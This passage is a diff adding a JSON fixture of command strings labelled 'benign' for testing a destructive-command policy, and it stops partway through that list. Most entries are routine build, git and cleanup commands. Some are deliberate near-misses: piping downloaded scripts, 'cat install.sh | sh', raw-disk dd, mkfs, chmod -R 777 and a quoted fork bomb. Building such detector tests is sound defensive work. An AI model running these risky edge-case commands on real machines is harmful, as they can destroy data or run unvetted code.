@@ -1,0 +1,3311 @@
+{
+ "note": "Labeled command strings for the destructive-command policy tests. Never run them. Rewrite with: node test/fixtures/make_destructive_corpus.js",
+ "benign": [
+  ". <(helm completion bash)",
+  ". ~/.bashrc",
+  "./gradlew assemble",
+  "Add-Content $PROFILE 'Set-Alias ll Get-ChildItem'",
+  "Copy-Item .\\a.txt $HOME\\Documents\\",
+  "Expand-Archive a.zip -DestinationPath out",
+  "Format-Table -AutoSize",
+  "Get-ChildItem -Recurse -Filter *.log",
+  "Get-Content $PROFILE",
+  "Get-Disk",
+  "Get-Process node | Stop-Process",
+  "Get-Volume",
+  "Invoke-Expression $command",
+  "Invoke-RestMethod https://example.com/api | Select-Object -First 1",
+  "Invoke-WebRequest https://example.com | Select-Object -ExpandProperty StatusCode",
+  "Invoke-WebRequest https://example.com/a.zip -OutFile a.zip",
+  "Remove-Item -Force old.log",
+  "Remove-Item -Recurse -Force $env:TEMP\\build-4821",
+  "Remove-Item -Recurse -Force .\\dist, .\\build",
+  "Remove-Item -Recurse -Force .\\node_modules",
+  "Remove-Item C:\\Users\\alice\\AppData\\Local\\Temp\\zn -Recurse",
+  "Set-Location $HOME",
+  "awk '{print $1}' access.log | sort | uniq",
+  "aws s3 cp build/ s3://example-bucket/ --recursive",
+  "aws s3 ls s3://example-bucket/",
+  "aws sts get-caller-identity",
+  "az group list",
+  "bash -c \"echo hello\"",
+  "bash -lc 'npm test'",
+  "bash <(echo hello)",
+  "blkid /dev/sda1",
+  "brew install jq",
+  "bundle install",
+  "cargo build --release",
+  "cargo clippy -- -D warnings",
+  "cargo fmt --check",
+  "cargo test",
+  "cat /dev/zero > /dev/null",
+  "cat /etc/hosts",
+  "cat /proc/mounts",
+  "cat docs/uninstall.md",
+  "cat file.txt | sh -n",
+  "cat install.sh | sh",
+  "cat local-script.sh | bash -s -- --dry-run",
+  "cat package.json | jq .name",
+  "cat ~/.bashrc",
+  "cd \"$HOME/projects\" && ls",
+  "cd / && ls",
+  "cd /home/alice && ls",
+  "cd /srv/app && rm --recursive --force .gradle .parcel-cache",
+  "cd /srv/app && rm --recursive --force .parcel-cache .tox",
+  "cd /srv/app && rm --recursive --force .tox dist",
+  "cd /srv/app && rm --recursive --force .turbo .pytest_cache",
+  "cd /srv/app && rm --recursive --force .venv dist",
+  "cd /srv/app && rm --recursive --force build .parcel-cache",
+  "cd /srv/app && rm --recursive --force build site-packages",
+  "cd /srv/app && rm --recursive --force coverage dist",
+  "cd /srv/app && rm --recursive --force node_modules target",
+  "cd /srv/app && rm --recursive --force site-packages .turbo",
+  "cd /srv/app && rm --recursive --force site-packages bin/Debug",
+  "cd /srv/app && rm --recursive --force site-packages vendor",
+  "cd /srv/app && rm --recursive --force vendor .turbo",
+  "cd /srv/app && rm -Rf .cache tmp",
+  "cd /srv/app && rm -Rf .next tmp",
+  "cd /srv/app && rm -Rf .turbo __pycache__",
+  "cd /srv/app && rm -Rf .turbo target",
+  "cd /srv/app && rm -Rf .venv __pycache__",
+  "cd /srv/app && rm -Rf __pycache__ .parcel-cache",
+  "cd /srv/app && rm -Rf obj .tox",
+  "cd /srv/app && rm -fr .gradle .cache",
+  "cd /srv/app && rm -fr bin/Debug .cache",
+  "cd /srv/app && rm -fr out __pycache__",
+  "cd /srv/app && rm -fr site-packages vendor",
+  "cd /srv/app && rm -fr tmp build",
+  "cd /srv/app && rm -r .cache .cache",
+  "cd /srv/app && rm -r target node_modules",
+  "cd /srv/app && rm -r target site-packages",
+  "cd /srv/app && rm -rf .gradle coverage",
+  "cd /srv/app && rm -rf .next dist",
+  "cd /srv/app && rm -rf .pytest_cache .turbo",
+  "cd /srv/app && rm -rf .pytest_cache vendor",
+  "cd /srv/app && rm -rf coverage build",
+  "cd /srv/app && rm -rf obj tmp",
+  "cd /srv/app && rm -rf site-packages out",
+  "cd /srv/app && rm -rf tmp .parcel-cache",
+  "cd /srv/app && rm -rv .cache bin/Debug",
+  "cd /srv/app && rm -rv .gradle .cache",
+  "cd /srv/app && rm -rv __pycache__ .parcel-cache",
+  "cd /srv/app && rm -rv obj site-packages",
+  "cd ~ && pwd",
+  "chgrp -R staff ./shared",
+  "chmod +x script.sh",
+  "chmod -R 755 ./dist",
+  "chmod -R 755 /var/www/html",
+  "chmod -R 777 ./tmp-uploads",
+  "chmod -R 777 build/tmp",
+  "chmod -R a+rX ./public",
+  "chmod -R go-w ~/.ssh",
+  "chmod -R u+rwX ~/projects/app",
+  "chmod 600 ~/.ssh/id_example",
+  "chmod 644 README.md",
+  "chmod 755 bin/run",
+  "chmod 777 /tmp/shared.sock",
+  "chown -R $USER:$USER ./data",
+  "chown -R www-data /var/www",
+  "chown -R www-data:www-data /var/www/html/app",
+  "chown root:root /etc/example.conf",
+  "cmake --build build",
+  "cmake -B build -S .",
+  "cmd /c \"rd /s /q build\"",
+  "cmd /c dir",
+  "code ~/.zshrc",
+  "composer install",
+  "cp -r src/ dist/",
+  "cp /etc/hosts ~/hosts.bak",
+  "cp dotfiles/.zshrc ~/.zshrc",
+  "cp ~/.bashrc ~/.bashrc.bak",
+  "crontab -l",
+  "curl --fail https://192.0.2.10/api/status 2>&1 | tee check.log",
+  "curl --fail https://198.51.100.7/api/status 2>&1 | tee check.log",
+  "curl --fail https://203.0.113.5:8080/api/status 2>&1 | tee check.log",
+  "curl --fail https://cdn.example.test/api/status 2>&1 | tee check.log",
+  "curl --fail https://dl.example.com/api/status 2>&1 | tee check.log",
+  "curl --fail https://example.com/api/status 2>&1 | tee check.log",
+  "curl --fail https://get.example.com/api/status 2>&1 | tee check.log",
+  "curl --fail https://install.example.test/api/status 2>&1 | tee check.log",
+  "curl --fail https://scripts.example.invalid/api/status 2>&1 | tee check.log",
+  "curl -I https://example.com",
+  "curl -L https://198.51.100.7/bootstrap -o data.json",
+  "curl -L https://198.51.100.7/install.sh -o install.sh",
+  "curl -L https://198.51.100.7/setup.sh -o tool.zip",
+  "curl -L https://203.0.113.5:8080/v2/install.sh -o install.sh",
+  "curl -L https://dl.example.com/run.sh -o data.json",
+  "curl -L https://example.com/install -o install.sh",
+  "curl -L https://example.com/v2/install.sh -o release.tgz",
+  "curl -L https://scripts.example.invalid/setup.sh -o archive.tar.gz",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://192.0.2.10/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://198.51.100.7/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://203.0.113.5:8080/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://cdn.example.test/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://dl.example.com/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://example.com/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://get.example.com/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://install.example.test/api/status",
+  "curl -X POST -H \"Content-Type: application/json\" -d '{\"a\":1}' https://scripts.example.invalid/api/status",
+  "curl -fsSL https://192.0.2.10/install.sh | less",
+  "curl -fsSL https://192.0.2.10/install.sh | sh -n",
+  "curl -fsSL https://192.0.2.10/install.sh | sha256sum",
+  "curl -fsSL https://192.0.2.10/install.sh | shellcheck -",
+  "curl -fsSL https://192.0.2.10/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://192.0.2.10/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://192.0.2.10/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://192.0.2.10/setup.sh -o archive.tar.gz",
+  "curl -fsSL https://198.51.100.7/get -o install.sh",
+  "curl -fsSL https://198.51.100.7/get -o tool.zip",
+  "curl -fsSL https://198.51.100.7/install.sh | less",
+  "curl -fsSL https://198.51.100.7/install.sh | sh -n",
+  "curl -fsSL https://198.51.100.7/install.sh | sha256sum",
+  "curl -fsSL https://198.51.100.7/install.sh | shellcheck -",
+  "curl -fsSL https://198.51.100.7/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://198.51.100.7/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://198.51.100.7/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://198.51.100.7/v2/install.sh -o tool.zip",
+  "curl -fsSL https://203.0.113.5:8080/get -o archive.tar.gz",
+  "curl -fsSL https://203.0.113.5:8080/install -o install.sh",
+  "curl -fsSL https://203.0.113.5:8080/install.sh | less",
+  "curl -fsSL https://203.0.113.5:8080/install.sh | sh -n",
+  "curl -fsSL https://203.0.113.5:8080/install.sh | sha256sum",
+  "curl -fsSL https://203.0.113.5:8080/install.sh | shellcheck -",
+  "curl -fsSL https://203.0.113.5:8080/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://203.0.113.5:8080/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://203.0.113.5:8080/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://cdn.example.test/install.sh | less",
+  "curl -fsSL https://cdn.example.test/install.sh | sh -n",
+  "curl -fsSL https://cdn.example.test/install.sh | sha256sum",
+  "curl -fsSL https://cdn.example.test/install.sh | shellcheck -",
+  "curl -fsSL https://cdn.example.test/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://cdn.example.test/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://cdn.example.test/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://dl.example.com/install.sh | less",
+  "curl -fsSL https://dl.example.com/install.sh | sh -n",
+  "curl -fsSL https://dl.example.com/install.sh | sha256sum",
+  "curl -fsSL https://dl.example.com/install.sh | shellcheck -",
+  "curl -fsSL https://dl.example.com/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://dl.example.com/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://dl.example.com/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://dl.example.com/setup.sh -o install.sh",
+  "curl -fsSL https://example.com/a -o ~/.config/app/config.toml",
+  "curl -fsSL https://example.com/install.sh | less",
+  "curl -fsSL https://example.com/install.sh | sh -n",
+  "curl -fsSL https://example.com/install.sh | sha256sum",
+  "curl -fsSL https://example.com/install.sh | shellcheck -",
+  "curl -fsSL https://example.com/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://example.com/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://example.com/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://example.com/x.sh > x.sh && shellcheck x.sh",
+  "curl -fsSL https://get.example.com/install.sh -o install.sh && less install.sh",
+  "curl -fsSL https://get.example.com/install.sh | bash -n",
+  "curl -fsSL https://get.example.com/install.sh | less",
+  "curl -fsSL https://get.example.com/install.sh | sh -n",
+  "curl -fsSL https://get.example.com/install.sh | sha256sum",
+  "curl -fsSL https://get.example.com/install.sh | shellcheck -",
+  "curl -fsSL https://get.example.com/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://get.example.com/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://get.example.com/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://install.example.test/install.sh | less",
+  "curl -fsSL https://install.example.test/install.sh | sh -n",
+  "curl -fsSL https://install.example.test/install.sh | sha256sum",
+  "curl -fsSL https://install.example.test/install.sh | shellcheck -",
+  "curl -fsSL https://install.example.test/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://install.example.test/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://install.example.test/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -fsSL https://scripts.example.invalid/install.sh | less",
+  "curl -fsSL https://scripts.example.invalid/install.sh | sh -n",
+  "curl -fsSL https://scripts.example.invalid/install.sh | sha256sum",
+  "curl -fsSL https://scripts.example.invalid/install.sh | shellcheck -",
+  "curl -fsSL https://scripts.example.invalid/key.gpg | gpg --dearmor -o /usr/share/keyrings/example.gpg",
+  "curl -fsSL https://scripts.example.invalid/pkg.tar.gz | tar xz -C /tmp/pkg",
+  "curl -fsSL https://scripts.example.invalid/repo.list | sudo tee /etc/apt/sources.list.d/example.list",
+  "curl -o ./config.json https://example.com/config.json",
+  "curl -s https://192.0.2.10/api/status > status.json",
+  "curl -s https://192.0.2.10/api/status | grep ok",
+  "curl -s https://192.0.2.10/api/status | jq -r .version",
+  "curl -s https://192.0.2.10/api/status | jq .",
+  "curl -s https://192.0.2.10/bootstrap -o install.sh",
+  "curl -s https://198.51.100.7/api/status > status.json",
+  "curl -s https://198.51.100.7/api/status | grep ok",
+  "curl -s https://198.51.100.7/api/status | jq -r .version",
+  "curl -s https://198.51.100.7/api/status | jq .",
+  "curl -s https://198.51.100.7/install -o tool.zip",
+  "curl -s https://198.51.100.7/install.sh -o tool.zip",
+  "curl -s https://203.0.113.5:8080/api/status > status.json",
+  "curl -s https://203.0.113.5:8080/api/status | grep ok",
+  "curl -s https://203.0.113.5:8080/api/status | jq -r .version",
+  "curl -s https://203.0.113.5:8080/api/status | jq .",
+  "curl -s https://203.0.113.5:8080/install.sh -o release.tgz",
+  "curl -s https://cdn.example.test/api/status > status.json",
+  "curl -s https://cdn.example.test/api/status | grep ok",
+  "curl -s https://cdn.example.test/api/status | jq -r .version",
+  "curl -s https://cdn.example.test/api/status | jq .",
+  "curl -s https://cdn.example.test/setup.sh -o data.json",
+  "curl -s https://dl.example.com/api/status > status.json",
+  "curl -s https://dl.example.com/api/status | grep ok",
+  "curl -s https://dl.example.com/api/status | jq -r .version",
+  "curl -s https://dl.example.com/api/status | jq .",
+  "curl -s https://example.com/api/status > status.json",
+  "curl -s https://example.com/api/status | grep ok",
+  "curl -s https://example.com/api/status | jq -r .version",
+  "curl -s https://example.com/api/status | jq .",
+  "curl -s https://get.example.com/api/status > status.json",
+  "curl -s https://get.example.com/api/status | grep ok",
+  "curl -s https://get.example.com/api/status | jq -r .version",
+  "curl -s https://get.example.com/api/status | jq .",
+  "curl -s https://install.example.test/api/status > status.json",
+  "curl -s https://install.example.test/api/status | grep ok",
+  "curl -s https://install.example.test/api/status | jq -r .version",
+  "curl -s https://install.example.test/api/status | jq .",
+  "curl -s https://scripts.example.invalid/api/status > status.json",
+  "curl -s https://scripts.example.invalid/api/status | grep ok",
+  "curl -s https://scripts.example.invalid/api/status | jq -r .version",
+  "curl -s https://scripts.example.invalid/api/status | jq .",
+  "curl -s https://scripts.example.invalid/bootstrap -o archive.tar.gz",
+  "curl -s https://scripts.example.invalid/install.sh -o release.tgz",
+  "curl -sI https://192.0.2.10/api/status | head -1",
+  "curl -sI https://198.51.100.7/api/status | head -1",
+  "curl -sI https://203.0.113.5:8080/api/status | head -1",
+  "curl -sI https://cdn.example.test/api/status | head -1",
+  "curl -sI https://dl.example.com/api/status | head -1",
+  "curl -sI https://example.com/api/status | head -1",
+  "curl -sI https://get.example.com/api/status | head -1",
+  "curl -sI https://install.example.test/api/status | head -1",
+  "curl -sI https://scripts.example.invalid/api/status | head -1",
+  "curl -sSL https://cdn.example.test/bootstrap -o data.json",
+  "curl -sSL https://cdn.example.test/install -o install.sh",
+  "curl -sSL https://dl.example.com/v2/install.sh -o data.json",
+  "curl -sSL https://example.com/install -o archive.tar.gz",
+  "curl -sSL https://example.com/run.sh -o data.json",
+  "curl -sSL https://get.example.com/install -o data.json",
+  "curl -sSL https://install.example.test/install -o install.sh",
+  "curl -sSL https://install.example.test/v2/install.sh -o install.sh",
+  "curl https://192.0.2.10/api/status | python3 -m json.tool",
+  "curl https://198.51.100.7/api/status | python3 -m json.tool",
+  "curl https://203.0.113.5:8080/api/status | python3 -m json.tool",
+  "curl https://cdn.example.test/api/status | python3 -m json.tool",
+  "curl https://dl.example.com/api/status | python3 -m json.tool",
+  "curl https://example.com/ | wc -c",
+  "curl https://example.com/api/status | python3 -m json.tool",
+  "curl https://get.example.com/api/status | python3 -m json.tool",
+  "curl https://install.example.test/api/status | python3 -m json.tool",
+  "curl https://scripts.example.invalid/api/status | python3 -m json.tool",
+  "curl ifconfig.me",
+  "dd if=/dev/sda of=backup.img bs=4M status=progress",
+  "dd if=/dev/urandom of=test.bin bs=1k count=4",
+  "dd if=/dev/zero of=./swap.img bs=1M count=1024",
+  "dd if=/dev/zero of=/dev/null bs=1M count=10",
+  "dd if=/dev/zero of=/dev/stdout bs=1 count=1",
+  "dd if=disk.iso of=/dev/null bs=4M",
+  "del /q *.tmp",
+  "del /s /q .\\dist\\*.map",
+  "df -h",
+  "diff -u a.txt b.txt",
+  "diff ~/.bashrc ~/dotfiles/bashrc",
+  "dir C:\\",
+  "docker build -t app:dev .",
+  "docker compose down -v",
+  "docker compose up -d",
+  "docker exec -it web sh -c \"rm -rf /app/cache\"",
+  "docker exec db psql -U postgres -c \"select 1\"",
+  "docker logs -f web",
+  "docker ps -a",
+  "docker pull nginx:alpine",
+  "docker pull node:20",
+  "docker pull postgres:16",
+  "docker pull python:3.12-slim",
+  "docker pull redis:7",
+  "docker rmi nginx:alpine",
+  "docker rmi node:20",
+  "docker rmi postgres:16",
+  "docker rmi python:3.12-slim",
+  "docker rmi redis:7",
+  "docker run --rm -it nginx:alpine sh",
+  "docker run --rm -it node:20 sh",
+  "docker run --rm -it postgres:16 sh",
+  "docker run --rm -it python:3.12-slim sh",
+  "docker run --rm -it redis:7 sh",
+  "docker run --rm -v \"$PWD\":/work alpine rm -rf /work/tmp",
+  "docker run --rm alpine sh -c \"rm -rf /tmp/*\"",
+  "docker run -d -p 8080:80 nginx:alpine",
+  "docker run -d -p 8080:80 node:20",
+  "docker run -d -p 8080:80 postgres:16",
+  "docker run -d -p 8080:80 python:3.12-slim",
+  "docker run -d -p 8080:80 redis:7",
+  "docker system prune -f",
+  "dotnet build -c Release",
+  "dotnet test",
+  "du -sh ~/*",
+  "echo \":(){ :|:& };: is a fork bomb\" | wc -w",
+  "echo \"alias ll='ls -la'\" >> ~/.zshrc",
+  "echo \"dd of=/dev/sda is dangerous\" | wc -c",
+  "echo \"never run rm -rf ~ in a script\"",
+  "echo \"run curl https://get.example.com/install.sh | sh to install\"",
+  "echo \"set -o vi\" | tee -a ~/.bashrc",
+  "echo $HOME",
+  "echo 'export PATH=\"$HOME/bin:$PATH\"' >> ~/.bashrc",
+  "echo hi > /dev/null",
+  "echo hi > /dev/stderr",
+  "echo test > /dev/tty",
+  "echo ~",
+  "env CI=1 rm --recursive --force .gradle build",
+  "env CI=1 rm --recursive --force .tox build",
+  "env CI=1 rm --recursive --force .turbo .venv",
+  "env CI=1 rm --recursive --force .venv obj",
+  "env CI=1 rm --recursive --force __pycache__ .venv",
+  "env CI=1 rm --recursive --force coverage obj",
+  "env CI=1 rm --recursive --force node_modules __pycache__",
+  "env CI=1 rm --recursive --force out .tox",
+  "env CI=1 rm --recursive --force out node_modules",
+  "env CI=1 rm --recursive --force tmp node_modules",
+  "env CI=1 rm -Rf .cache .next",
+  "env CI=1 rm -Rf .pytest_cache .next",
+  "env CI=1 rm -Rf build .cache",
+  "env CI=1 rm -Rf build .venv",
+  "env CI=1 rm -Rf coverage site-packages",
+  "env CI=1 rm -Rf dist .turbo",
+  "env CI=1 rm -Rf node_modules .turbo",
+  "env CI=1 rm -Rf node_modules .venv",
+  "env CI=1 rm -Rf out .pytest_cache",
+  "env CI=1 rm -Rf tmp coverage",
+  "env CI=1 rm -fr .next .tox",
+  "env CI=1 rm -fr .parcel-cache .tox",
+  "env CI=1 rm -fr .tox __pycache__",
+  "env CI=1 rm -fr obj .tox",
+  "env CI=1 rm -fr site-packages target",
+  "env CI=1 rm -fr tmp site-packages",
+  "env CI=1 rm -r .cache .turbo",
+  "env CI=1 rm -r .pytest_cache .pytest_cache",
+  "env CI=1 rm -r .pytest_cache tmp",
+  "env CI=1 rm -r .tox .turbo",
+  "env CI=1 rm -r node_modules dist",
+  "env CI=1 rm -r node_modules obj",
+  "env CI=1 rm -r obj .venv",
+  "env CI=1 rm -r target obj",
+  "env CI=1 rm -rf .gradle bin/Debug",
+  "env CI=1 rm -rf .venv tmp",
+  "env CI=1 rm -rf dist target",
+  "env CI=1 rm -rf target site-packages",
+  "env CI=1 rm -rv .gradle tmp",
+  "env CI=1 rm -rv .pytest_cache target",
+  "env CI=1 rm -rv .tox __pycache__",
+  "env CI=1 rm -rv .tox build",
+  "env CI=1 rm -rv out .parcel-cache",
+  "env CI=1 rm -rv site-packages dist",
+  "env CI=1 rm -rv vendor .cache",
+  "env NODE_ENV=production node app.js",
+  "eslint src --ext .ts",
+  "eval \"$(pyenv init -)\"",
+  "eval \"$(ssh-agent -s)\"",
+  "exec zsh -l",
+  "export FOO=bar && node app.js",
+  "fdisk -l /dev/sda",
+  "find . -name \"*.pyc\" -delete",
+  "find . -name \"*.tmp\" | xargs rm",
+  "find . -name node_modules -type d -prune -exec rm -rf {} +",
+  "find . -type f -empty -delete",
+  "find / -name \"*.orig\" -type f 2>/dev/null",
+  "find /tmp -mtime +7 -delete",
+  "find /var/log -name \"*.gz\" -mtime +14 -delete",
+  "find ~ -name \"*.bak\" -mtime +30 -delete",
+  "find ~/Downloads -type f -name \"*.iso\"",
+  "find ~/projects -name .DS_Store -delete",
+  "flutter pub get",
+  "gcloud compute instances list",
+  "git add -A && git commit -m \"wip\"",
+  "git bisect start",
+  "git blame src/index.js",
+  "git branch -d chore/deps",
+  "git branch -d develop",
+  "git branch -d feat/login",
+  "git branch -d fix/null-check",
+  "git branch -d main",
+  "git branch -d next",
+  "git branch -d release/1.4",
+  "git checkout chore/deps",
+  "git checkout develop",
+  "git checkout feat/login",
+  "git checkout fix/null-check",
+  "git checkout main",
+  "git checkout next",
+  "git checkout release/1.4",
+  "git clean -fd",
+  "git clean -fdx -n",
+  "git commit -m \"docs: warn that curl | sh installs are unsafe\"",
+  "git commit -m \"remove rm -rf ~ from the cleanup script\"",
+  "git diff chore/deps...HEAD --stat",
+  "git diff develop...HEAD --stat",
+  "git diff feat/login...HEAD --stat",
+  "git diff fix/null-check...HEAD --stat",
+  "git diff main...HEAD --stat",
+  "git diff next...HEAD --stat",
+  "git diff release/1.4...HEAD --stat",
+  "git fetch --all --prune",
+  "git grep \"dd if=\" -- scripts",
+  "git log --oneline origin/chore/deps..HEAD",
+  "git log --oneline origin/develop..HEAD",
+  "git log --oneline origin/feat/login..HEAD",
+  "git log --oneline origin/fix/null-check..HEAD",
+  "git log --oneline origin/main..HEAD",
+  "git log --oneline origin/next..HEAD",
+  "git log --oneline origin/release/1.4..HEAD",
+  "git log -p -- README.md",
+  "git merge --no-ff chore/deps",
+  "git merge --no-ff develop",
+  "git merge --no-ff feat/login",
+  "git merge --no-ff fix/null-check",
+  "git merge --no-ff main",
+  "git merge --no-ff next",
+  "git merge --no-ff release/1.4",
+  "git pull --rebase origin chore/deps",
+  "git pull --rebase origin develop",
+  "git pull --rebase origin feat/login",
+  "git pull --rebase origin fix/null-check",
+  "git pull --rebase origin main",
+  "git pull --rebase origin next",
+  "git pull --rebase origin release/1.4",
+  "git push origin chore/deps",
+  "git push origin develop",
+  "git push origin feat/login",
+  "git push origin fix/null-check",
+  "git push origin main",
+  "git push origin next",
+  "git push origin release/1.4",
+  "git rebase HEAD~3",
+  "git remote -v",
+  "git reset --hard HEAD~1",
+  "git restore --staged .",
+  "git stash push -m \"before rebase\"",
+  "git status",
+  "git submodule update --init --recursive",
+  "git switch -c chore/deps",
+  "git switch -c develop",
+  "git switch -c feat/login",
+  "git switch -c fix/null-check",
+  "git switch -c main",
+  "git switch -c next",
+  "git switch -c release/1.4",
+  "git tag -a v1.2.3 -m \"release\"",
+  "git worktree add ../wt-fix fix/x",
+  "go build ./...",
+  "go mod tidy",
+  "go test ./... -race",
+  "gradle build -x test",
+  "grep -n alias ~/.bashrc",
+  "grep -r \"curl .* | sh\" scripts/",
+  "grep -rn \"iex\" src/",
+  "grep -rn \"rm -rf /\" docs/",
+  "hdparm -I /dev/sda | head",
+  "helm upgrade --install app ./chart",
+  "icacls C:\\work\\app /grant Users:F /T",
+  "iex \"dotnet build\"",
+  "irm https://example.com/api/status | ConvertFrom-Json",
+  "iwr https://example.com/a.zip -OutFile $env:TEMP\\a.zip",
+  "journalctl -u app -n 100",
+  "kill -9 4242",
+  "kubectl apply -f deploy.yaml",
+  "kubectl delete pod web-1 -n staging",
+  "kubectl get pods -n staging",
+  "kubectl logs deploy/api --tail=100",
+  "less cleanup.sh",
+  "ln -sf ~/dotfiles/zshrc ~/.zshrc",
+  "losetup -f disk.img",
+  "ls -la",
+  "ls -la /",
+  "ls -ld ~",
+  "ls /Users",
+  "ls /home",
+  "ls ~",
+  "ls ~/.ssh",
+  "lsblk",
+  "make",
+  "make -j4 all",
+  "make clean",
+  "man rm",
+  "mkdir -p out/logs",
+  "mkfs.ext4 -F ./test-disk.img",
+  "mkfs.ext4 ./disk.img",
+  "mkfs.ext4 /dev/loop0",
+  "mkfs.vfat -n TEST ./usb.img",
+  "mkswap swapfile",
+  "mount /dev/sdb1 /mnt/usb",
+  "mv build build.old",
+  "mvn -q clean package",
+  "mypy src",
+  "nc -zv 198.51.100.7 22",
+  "node --test",
+  "node index.js",
+  "nohup node server.js &",
+  "notepad $PROFILE",
+  "npm audit",
+  "npm ci",
+  "npm install --save-dev @types/node",
+  "npm install --save-dev express",
+  "npm install --save-dev left-pad",
+  "npm install --save-dev react",
+  "npm install --save-dev typescript",
+  "npm install --save-dev zod",
+  "npm install @types/node",
+  "npm install express",
+  "npm install left-pad",
+  "npm install react",
+  "npm install typescript",
+  "npm install zod",
+  "npm publish --dry-run",
+  "npm run build",
+  "npm run dev",
+  "npm run lint -- --fix",
+  "npm test",
+  "npm uninstall @types/node",
+  "npm uninstall express",
+  "npm uninstall left-pad",
+  "npm uninstall react",
+  "npm uninstall typescript",
+  "npm uninstall zod",
+  "npm.cmd install",
+  "npx tsc --noEmit",
+  "nslookup example.com",
+  "openssl rand -hex 16",
+  "ping -c 3 192.0.2.1",
+  "pip install -U black",
+  "pip install -U fastapi",
+  "pip install -U numpy",
+  "pip install -U pytest",
+  "pip install -U requests",
+  "pip install -r requirements.txt",
+  "pip install black",
+  "pip install fastapi",
+  "pip install numpy",
+  "pip install pytest",
+  "pip install requests",
+  "pip uninstall -y black",
+  "pip uninstall -y fastapi",
+  "pip uninstall -y numpy",
+  "pip uninstall -y pytest",
+  "pip uninstall -y requests",
+  "pkill -f node",
+  "pnpm -r build",
+  "pnpm add @types/node",
+  "pnpm add express",
+  "pnpm add left-pad",
+  "pnpm add react",
+  "pnpm add typescript",
+  "pnpm add zod",
+  "poetry install",
+  "powershell -Command \"Get-Date\"",
+  "prettier --check .",
+  "printf \"export EDITOR=vim\\n\" >> $HOME/.profile",
+  "ps aux | grep node",
+  "pwsh -c \"dotnet test\"",
+  "pytest -q tests/",
+  "python -m pip install black --user",
+  "python -m pip install fastapi --user",
+  "python -m pip install numpy --user",
+  "python -m pip install pytest --user",
+  "python -m pip install requests --user",
+  "python -m pytest -x",
+  "python -m venv .venv",
+  "python3 -c \"print('rm -rf /')\"",
+  "rake test",
+  "rd /s /q build",
+  "rd /s /q node_modules",
+  "rg \"chmod -R 777\" .",
+  "ri .\\out -Recurse -Force",
+  "rm --help",
+  "rm --recursive --force \"$HOME/.local/share/Trash\"",
+  "rm --recursive --force ./out",
+  "rm --recursive --force .next coverage",
+  "rm --recursive --force .next tmp",
+  "rm --recursive --force .pytest_cache obj",
+  "rm --recursive --force .tox .turbo",
+  "rm --recursive --force .turbo .turbo",
+  "rm --recursive --force .turbo dist",
+  "rm --recursive --force .venv .tox",
+  "rm --recursive --force .venv __pycache__",
+  "rm --recursive --force /etc/apt/sources.list.d/example.list",
+  "rm --recursive --force /home/alice/projects/app/build",
+  "rm --recursive --force /mnt/data/cache",
+  "rm --recursive --force /root/.cache/pip",
+  "rm --recursive --force /var/cache/apk/*",
+  "rm --recursive --force __pycache__ .next",
+  "rm --recursive --force __pycache__ .tox",
+  "rm --recursive --force bin/Debug .gradle",
+  "rm --recursive --force bin/Debug .tox",
+  "rm --recursive --force bin/Debug coverage",
+  "rm --recursive --force build .gradle",
+  "rm --recursive --force build .tox",
+  "rm --recursive --force build vendor",
+  "rm --recursive --force dist .turbo",
+  "rm --recursive --force dist tmp",
+  "rm --recursive --force target target",
+  "rm --recursive --force tmp target",
+  "rm --recursive --force vendor .next",
+  "rm --recursive --force ~/projects/old-app",
+  "rm -Rf .gradle __pycache__",
+  "rm -Rf .gradle build",
+  "rm -Rf .next .venv",
+  "rm -Rf .next bin/Debug",
+  "rm -Rf .parcel-cache .turbo",
+  "rm -Rf .pytest_cache .parcel-cache",
+  "rm -Rf .tox .turbo",
+  "rm -Rf .tox vendor",
+  "rm -Rf .turbo obj",
+  "rm -Rf .venv .turbo",
+  "rm -Rf .venv .venv",
+  "rm -Rf bin/Debug obj",
+  "rm -Rf bin/Debug out",
+  "rm -Rf bin/Debug site-packages",
+  "rm -Rf build .tox",
+  "rm -Rf build node_modules",
+  "rm -Rf dist .pytest_cache",
+  "rm -Rf node_modules __pycache__",
+  "rm -Rf obj .next",
+  "rm -Rf obj bin/Debug",
+  "rm -Rf site-packages .venv",
+  "rm -Rf vendor obj",
+  "rm -f *.log",
